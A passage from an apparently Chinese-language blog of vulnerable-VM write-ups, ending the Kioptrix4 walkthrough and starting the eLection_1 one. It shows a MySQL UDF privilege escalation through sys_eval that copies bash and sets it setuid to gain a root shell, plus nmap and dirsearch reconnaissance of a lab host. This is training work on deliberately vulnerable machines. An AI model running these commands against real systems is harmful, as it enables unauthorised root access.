14  2008 libmysqlclient_r.so.15.0.0<br>52089 lrwxrwxrwx  1 root root   17 Feb  4  2012 libnewt.so.0.52 -&gt; libnewt.so.0.52.2<br>52088 -rw-r--r--  1 root root  72K Mar 24  2008 libnewt.so.0.52.2<br>52091 lrwxrwxrwx  1 root root   20 Feb  4  2012 libopencdk.so.10 -&gt; libopencdk.so.10.0.6<br>52090 -rw-r--r--  1 root root 136K Dec  3  2007 libopencdk.so.10.0.6<br>49823 lrwxrwxrwx  1 root root   15 Feb  4  2012 libpanel.so.5 -&gt; libpanel.so.5.6<br>49811 -rw-r--r--  1 root root 9.1K Feb 23  2008 libpanel.so.5.6<br>52085 lrwxrwxrwx  1 root root   16 Feb  4  2012 libpanelw.so.5 -&gt; libpanelw.so.5.6<br>52082 -rw-r--r--  1 root root 9.1K Feb 23  2008 libpanelw.so.5.6<br>53286 lrwxrwxrwx  1 root root   16 Feb  4  2012 libpcap.so.0.8 -&gt; libpcap.so.0.9.8<br>53285 -rw-r--r--  1 root root 159K Nov 15  2007 libpcap.so.0.9.8<br>53660 lrwxrwxrwx  1 root root   17 Feb  4  2012 libpcre.so.3 -&gt; libpcre.so.3.12.1<br>53656 -rw-r--r--  1 root root 154K Jul  9  2008 libpcre.so.3.12.1<br>53661 lrwxrwxrwx  1 root root   22 Feb  4  2012 libpcreposix.so.3 -&gt; libpcreposix.so.3.12.1<br>53657 -rw-r--r--  1 root root 5.2K Jul  9  2008 libpcreposix.so.3.12.1<br>53616 lrwxrwxrwx  1 root root   12 Feb  4  2012 libpq.so.5 -&gt; libpq.so.5.1<br>53615 -rw-r--r--  1 root root 125K Apr  6  2009 libpq.so.5.1<br>52336 lrwxrwxrwx  1 root root   19 Feb  4  2012 libpython2.5.so.1 -&gt; libpython2.5.so.1.0<br>52328 -rw-r--r--  1 root root 1.2M Jul 31  2008 libpython2.5.so.1.0<br>51414 lrwxrwxrwx  1 root root   18 Feb  4  2012 libsasl2.so.2 -&gt; libsasl2.so.2.0.22<br>51413 -rw-r--r--  1 root root  88K Jun 23  2009 libsasl2.so.2.0.22<br>51568 lrwxrwxrwx  1 root root   20 Feb  4  2012 libsigc-2.0.so.0 -&gt; libsigc-2.0.so.0.0.0<br>51567 -rw-r--r--  1 root root  20K Apr  3  2008 libsigc-2.0.so.0.0.0<br>52101 lrwxrwxrwx  1 root root   19 Feb  4  2012 libsqlite3.so.0 -&gt; libsqlite3.so.0.8.6<br>52100 -rw-r--r--  1 root root 401K Oct 24  2007 libsqlite3.so.0.8.6<br>52099 -rw-r--r--  1 root root 259K Jun 11  2009 libssl.so.0.9.8<br>49909 lrwxrwxrwx  1 root root   18 Feb  4  2012 libstdc++.so.6 -&gt; libstdc++.so.6.0.9<br>49908 -rw-r--r--  1 root root 948K Feb 19  2009 libstdc++.so.6.0.9<br>52080 lrwxrwxrwx  1 root root   18 Feb  4  2012 libtasn1.so.3 -&gt; libtasn1.so.3.0.12<br>51680 -rw-r--r--  1 root root  61K Dec  3  2007 libtasn1.so.3.0.12<br>52081 lrwxrwxrwx  1 root root   20 Feb  4  2012 libusb-0.1.so.4 -&gt; /lib/libusb-0.1.so.4<br>53665 lrwxrwxrwx  1 root root   17 Feb  4  2012 libxml2.so.2 -&gt; libxml2.so.2.6.31<br>53664 -rw-r--r--  1 root root 1.2M Nov 18  2008 libxml2.so.2.6.31<br>51050 lrwxrwxrwx  1 root root   15 Feb  4  2012 libz.so.1 -&gt; libz.so.1.2.3.3<br>51048 -rw-r--r--  1 root root  80K Nov 15  2007 libz.so.1.2.3.3<br>49064 drwxr-xr-x  3 root root 4.0K Feb  4  2012 locale<br>98439 drwxr-xr-x  2 root root 4.0K Feb  4  2012 man-db<br>49706 drwxr-xr-x  3 root root 4.0K Feb  4  2012 mime<br>98542 drwxr-xr-x  2 root root 4.0K Feb  4  2012 openssh<br>66199 drwxr-xr-x  2 root root 4.0K Feb  4  2012 pcmciautils<br>57122 drwxr-xr-x  3 root root 4.0K Feb  4  2012 perl<br>50278 drwxr-xr-x 12 root root 4.0K Feb  4  2012 perl5<br>83589 drwxr-xr-x  4 root root 4.0K Feb  4  2012 php5<br>98628 drwxr-xr-x  3 root root 4.0K Feb  4  2012 pppd<br>51653 -rwsr-xr-x  1 root root 9.4K Sep 12  2008 pt_chown<br>98659 drwxr-xr-x  3 root root 4.0K Feb  4  2012 python-support<br>98662 drwxr-xr-x  3 root root 4.0K Feb  4  2012 python2.3<br>49660 drwxr-xr-x  4 root root 4.0K Feb  4  2012 python2.4<br>49663 drwxr-xr-x 22 root root  16K Feb  4  2012 python2.5<br>91531 drwxr-xr-x  5 root root 4.0K Feb  4  2012 samba<br>65616 drwxr-xr-x  2 root root 4.0K Feb  4  2012 sasl2<br>53677 lrwxrwxrwx  1 root root   19 Feb  4  2012 sftp-server -&gt; openssh/sftp-server<br>65958 drwxr-xr-x  3 root root 4.0K Feb  4  2012 ssl<br>66565 drwxr-xr-x  2 root root 4.0K Feb  4  2012 sudo<br>66580 drwxr-xr-x  5 root root 4.0K Feb  4  2012 tasksel<br>65808 drwxr-xr-x  2 root root 4.0K Feb  4  2012 tc<br>66649 drwxr-xr-x  2 root root 4.0K Feb  4  2012 udev<br>59024 drwxr-xr-x  2 root root 4.0K Feb  4  2012 upstart<br>66230 drwxr-xr-x  2 root root 4.0K Feb  4  2012 valgrind<br>98747 drwxr-xr-x  3 root root 4.0K Feb  4  2012 w3m<br></code></pre></td></tr></table></figure><p>难不成这里不需要这个步骤了……</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> * from mysql.func;<br><span class="hljs-keyword">select</span> * from mysql.func;<br>+-----------------------+-----+---------------------+----------+<br>| name                  | ret | dl                  | <span class="hljs-built_in">type</span>     |<br>+-----------------------+-----+---------------------+----------+<br>| lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | <span class="hljs-keyword">function</span> | <br>| sys_exec              |   0 | lib_mysqludf_sys.so | <span class="hljs-keyword">function</span> | <br>+-----------------------+-----+---------------------+----------+<br>3 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><p>淦，竟然直接就有了，不需要我再累死累活上传动态链接库（靶机上没有 gcc 环境，所以也没法自己编译）</p><p>不过严谨起见，还是自己在创建一个系统调用的函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; CREATE FUNCTION sys_eval RETURNS STRING SONAME <span class="hljs-string">&#x27;lib_mysqludf_sys.so&#x27;</span>;<br>CREATE FUNCTION sys_eval RETURNS STRING SONAME <span class="hljs-string">&#x27;lib_mysqludf_sys.so&#x27;</span>;<br>ERROR 1046 (3D000): No database selected<br>mysql&gt; show databases;<br>show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema | <br>| members            | <br>| mysql              | <br>+--------------------+<br>3 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; use mysql<br>use mysql<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>mysql&gt; CREATE FUNCTION sys_eval RETURNS STRING SONAME <span class="hljs-string">&#x27;lib_mysqludf_sys.so&#x27;</span>;<br>CREATE FUNCTION sys_eval RETURNS STRING SONAME <span class="hljs-string">&#x27;lib_mysqludf_sys.so&#x27;</span>;<br>Query OK, 0 rows affected (0.00 sec)<br><br>mysql&gt; <span class="hljs-keyword">select</span> * from mysql.func;<br><span class="hljs-keyword">select</span> * from mysql.func;<br>+-----------------------+-----+---------------------+----------+<br>| name                  | ret | dl                  | <span class="hljs-built_in">type</span>     |<br>+-----------------------+-----+---------------------+----------+<br>| lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | <span class="hljs-keyword">function</span> | <br>| sys_exec              |   0 | lib_mysqludf_sys.so | <span class="hljs-keyword">function</span> | <br>| sys_eval              |   0 | lib_mysqludf_sys.so | <span class="hljs-keyword">function</span> | <br>+-----------------------+-----+---------------------+----------+<br>3 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; <span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>+--------------------+<br>| sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>) |<br>+--------------------+<br>| root<br>              | <br>+--------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.02 sec)<br></code></pre></td></tr></table></figure><p>成功！不过关于这里 UDF 提权的原理，并没有深刻理解，这也是导致我在这里卡很久的原因</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;cp /bin/bash /tmp/bash;chmod +sx /tmp/bash&#x27;</span>);<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;cp /bin/bash /tmp/bash;chmod +sx /tmp/bash&#x27;</span>);<br>+--------------------------------------------------------+<br>| sys_eval(<span class="hljs-string">&#x27;cp /bin/bash /tmp/bash;chmod +sx /tmp/bash&#x27;</span>) |<br>+--------------------------------------------------------+<br>|                                                        | <br>+--------------------------------------------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.06 sec)<br></code></pre></td></tr></table></figure><p>另一边看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">john@Kioptrix4:/tmp$ <span class="hljs-built_in">ls</span><br>40839.c  bash  cowpy-x86  cowroot  dcow  firefart_dirtycow  linpeas.sh<br>john@Kioptrix4:/tmp$ ./bash -p<br>bash-3.2<span class="hljs-comment"># whoami</span><br>root<br>bash-3.2<span class="hljs-comment"># uname -a</span><br>Linux Kioptrix4 2.6.24-24-server <span class="hljs-comment">#1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux                                  </span><br>bash-3.2<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:d5:52:bc brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.135/24 brd 192.1.1.255 scope global eth1<br>bash-3.2<span class="hljs-comment"># cd /root</span><br>bash-3.2<span class="hljs-comment"># ls -liah</span><br>total 44K<br>171361 drwxr-xr-x  4 root       root       4.0K 2012-02-06 18:46 .<br>     2 drwxr-xr-x 21 root       root       4.0K 2012-02-06 18:41 ..<br>171365 -rw-------  1 root       root         59 2012-02-06 20:24 .bash_history<br>171363 -rw-r--r--  1 root       root       2.2K 2007-10-20 07:51 .bashrc<br>171368 -rw-r--r--  1 root       root        625 2012-02-06 10:48 congrats.txt<br>171393 -rw-r--r--  1 root       root          1 2012-02-05 10:38 .lhistory<br>171367 drwxr-xr-x  8 loneferret loneferret 4.0K 2012-02-04 17:01 lshell-0.9.12<br>171364 -rw-------  1 root       root          1 2012-02-05 10:38 .mysql_history<br>171366 -rw-------  1 root       root          5 2012-02-06 18:38 .nano_history<br>171362 -rw-r--r--  1 root       root        141 2007-10-20 07:51 .profile<br>171394 drwx------  2 root       root       4.0K 2012-02-06 11:43 .ssh<br>bash-3.2<span class="hljs-comment"># cat congrats.txt</span><br>Congratulations!<br>You\<span class="hljs-string">&#x27;ve got root.</span><br><span class="hljs-string"></span><br><span class="hljs-string">There is more then one way to get root on this system. Try and find them.</span><br><span class="hljs-string">I\&#x27;</span>ve only tested two (2) methods, but it doesn<span class="hljs-string">&#x27;t mean there aren&#x27;</span>t more.<br>As always there\<span class="hljs-string">&#x27;s an easy way, and a not so easy way to pop this box.</span><br><span class="hljs-string">Look for other methods to get root privileges other than running an exploit.</span><br><span class="hljs-string"></span><br><span class="hljs-string">It took a while to make this. For one it\&#x27;</span>s not as easy as it may look, and<br>also work and family life are my priorities. Hobbies are low on my list.<br>Really hope you enjoyed this one.<br><br>If you haven\<span class="hljs-string">&#x27;t already, check out the other VMs available on:</span><br><span class="hljs-string">www.kioptrix.com</span><br><span class="hljs-string"></span><br><span class="hljs-string">Thanks for playing,</span><br><span class="hljs-string">loneferret</span><br></code></pre></td></tr></table></figure><p>不过这里有个比较奇葩的地方，当我在没有提权前信息收集的时候发现，root 目录竟然是可读的……我在没有提权成功的时候就已经读过了 <code>congrats.txt</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这台靶机总体难度不大，但是提权部分卡了我很久，对于 UDF 提权，很多博客的思路都是写入 plungin 插件目录下，但是也可以用另一种方式解释：MySQL 进程一般是 mysql 用户去调用的，但是这里确实 root 用户，那么也许是用户希望使用 MySQL 去调用一些 root 权限的文件或任务，那么我就可以考虑检测 MySQL 自建函数 <code>select * from mysql.func;</code>，进而判断出 UDF 提权。</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>eLection_1 靶机</title>
    <link href="/2023/07/18f5865fb0df.html"/>
    <url>/2023/07/18f5865fb0df.html</url>
    
    <content type="html"><![CDATA[<h1 id="eLection-1-靶机"><a href="#eLection-1-靶机" class="headerlink" title="eLection_1 靶机"></a>eLection_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.128 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-11 11:38 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.128<br>Host is up (0.00067s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:FE:C8:1D (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.04 seconds<br></code></pre></td></tr></table></figure><p>开放了 22 端口和 80 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 192.168.56.128<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-11 11:39 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.128<br>Host is up (0.00052s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)<br>|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)<br>|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>MAC Address: 08:00:27:FE:C8:1D (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.53 seconds<br></code></pre></td></tr></table></figure><p>Ubuntu 操作系统，80 端口是 apache 搭建的，首页是 apache2 的默认界面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 192.168.56.128 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-11 11:41 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.128<br>Host is up (0.00054s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|   /phpinfo.php: Possible information file</span><br><span class="hljs-string">|_  /phpmyadmin/: phpMyAdmin</span><br><span class="hljs-string">MAC Address: 08:00:27:FE:C8:1D (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 37.52 seconds</span><br></code></pre></td></tr></table></figure><p>漏洞脚本扫描得到了 <code>robots.txt</code>, <code>phpinfo.php</code>, <code>phpmyadmin</code></p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>打开 robots.txt 查看，并使用 dirsearch 进行目录爆破。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/eLection_1]<br>└─$ sudo dirsearch -u http://192.168.56.128         <br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.128/_23-07-11_11-46-56.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-07-11_11-46-56.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.128/<br><br>[11:46:56] Starting: <br>[11:46:57] 403 -  279B  - /.ht_wsr.txt                                     <br>[11:46:57] 403 -  279B  - /.htaccess.bak1<br>[11:46:57] 403 -  279B  - /.htaccess.save<br>[11:46:57] 403 -  279B  - /.htaccess.sample<br>[11:46:57] 403 -  279B  - /.htaccess.orig<br>[11:46:57] 403 -  279B  - /.htaccessBAK<br>[11:46:57] 403 -  279B  - /.htaccess_sc<br>[11:46:57] 403 -  279B  - /.htaccess_extra<br>[11:46:57] 403 -  279B  - /.htaccessOLD2<br>[11:46:57] 403 -  279B  - /.htaccess_orig<br>[11:46:57] 403 -  279B  - /.htaccessOLD<br>[11:46:57] 403 -  279B  - /.htm                                            <br>[11:46:57] 403 -  279B  - /.html<br>[11:46:57] 403 -  279B  - /.htpasswds<br>[11:46:57] 403 -  279B  - /.htpasswd_test                                  <br>[11:46:57] 403 -  279B  - /.httr-oauth<br>[11:46:58] 403 -  279B  - /.php                                            <br>[11:47:16] 200 -   11KB - /index.html                                       <br>[11:47:16] 301 -  321B  - /javascript  -&gt;  http://192.168.56.128/javascript/<br>[11:47:21] 200 -   13KB - /phpmyadmin/doc/html/index.html                   <br>[11:47:22] 301 -  321B  - /phpmyadmin  -&gt;  http://192.168.56.128/phpmyadmin/<br>[11:47:22] 200 -   94KB - /phpinfo.php                                      <br>[11:47:23] 200 -   10KB - /phpmyadmin/                                      <br>[11:47:23] 200 -   10KB - /phpmyadmin/index.php                             <br>[11:47:25] 200 -   30B  - /robots.txt                                       <br>[11:47:25] 403 -  279B  - /server-status/                                   <br>[11:47:25] 403 -  279B  - /server-status<br></code></pre></td></tr></table></figure><p>目录爆破并没有得到有效信息，而 robots.txt 给出了一些看起来可能是目录的东西</p><p><img src="/pic/95fc10fc0dfddc51f6a2d833d0ac2ba3_MD5.png"></p><p>依次手动尝试发现只有 election 目录可以访问</p><p><img src="/pic/bb5383a668f2e29b79f455ad5ec899e2_MD5.png"></p><p>是一个投票系统，提示注册成为 admin,然后在下方输入投票代码，尝试输入了一下发现只有五个字符才会有验证码错误的提示</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">Voter&#x27;s Code is incorrect! Please<span class="hljs-built_in"> check </span>or re-register!<br></code></pre></td></tr></table></figure><p>burp 抓包发现</p><p><img src="/pic/e68b9ea09369e454c649f52503e30a73_MD5.png"></p><p>POST 请求发向另一个 php 文件，并且 election 目录下似乎有别的目录，尝试再一次目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo dirsearch -u http://192.168.56.128/election/<br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.128/-election-_23-07-15_04-29-09.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-07-15_04-29-09.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.128/election/<br><br>[04:29:09] Starting: <br>[04:29:09] 301 -  322B  - /election/js  -&gt;  http://192.168.56.128/election/js/<br>[04:29:10] 403 -  279B  - /election/.ht_wsr.txt                            <br>[04:29:10] 403 -  279B  - /election/.htaccess.bak1                         <br>[04:29:10] 403 -  279B  - /election/.htaccess_extra<br>[04:29:10] 403 -  279B  - /election/.htaccess.orig<br>[04:29:10] 403 -  279B  - /election/.htaccess_sc<br>[04:29:10] 403 -  279B  - /election/.htaccess.save<br>[04:29:10] 403 -  279B  - /election/.htaccess_orig<br>[04:29:10] 403 -  279B  - /election/.htaccessOLD2<br>[04:29:11] 403 -  279B  - /election/.htaccessBAK<br>[04:29:11] 403 -  279B  - /election/.htaccess.sample<br>[04:29:11] 403 -  279B  - /election/.html<br>[04:29:11] 403 -  279B  - /election/.htaccessOLD<br>[04:29:11] 403 -  279B  - /election/.htm<br>[04:29:11] 403 -  279B  - /election/.htpasswds                             <br>[04:29:11] 403 -  279B  - /election/.htpasswd_test<br>[04:29:11] 403 -  279B  - /election/.httr-oauth<br>[04:29:11] 403 -  279B  - /election/.php                                   <br>[04:29:16] 301 -  325B  - /election/admin  -&gt;  http://192.168.56.128/election/admin/<br>[04:29:16] 200 -    9KB - /election/admin/?/login                           <br>[04:29:16] 403 -  279B  - /election/admin/.htaccess<br>[04:29:16] 200 -    9KB - /election/admin/                                  <br>[04:29:17] 200 -    9KB - /election/admin/index.php                         <br>[04:29:17] 200 -  985B  - /election/admin/logs/                             <br>[04:29:25] 301 -  324B  - /election/data  -&gt;  http://192.168.56.128/election/data/<br>[04:29:25] 200 -  766B  - /election/data/                                   <br>[04:29:29] 200 -    7KB - /election/index.php                               <br>[04:29:29] 200 -    7KB - /election/index.php/login/                        <br>[04:29:30] 200 -  989B  - /election/js/                                     <br>[04:29:30] 301 -  329B  - /election/languages  -&gt;  http://192.168.56.128/election/languages/<br>[04:29:30] 301 -  323B  - /election/lib  -&gt;  http://192.168.56.128/election/lib/<br>[04:29:30] 200 -  967B  - /election/lib/                                    <br>[04:29:32] 301 -  325B  - /election/media  -&gt;  http://192.168.56.128/election/media/<br>[04:29:32] 200 -    2KB - /election/media/                                  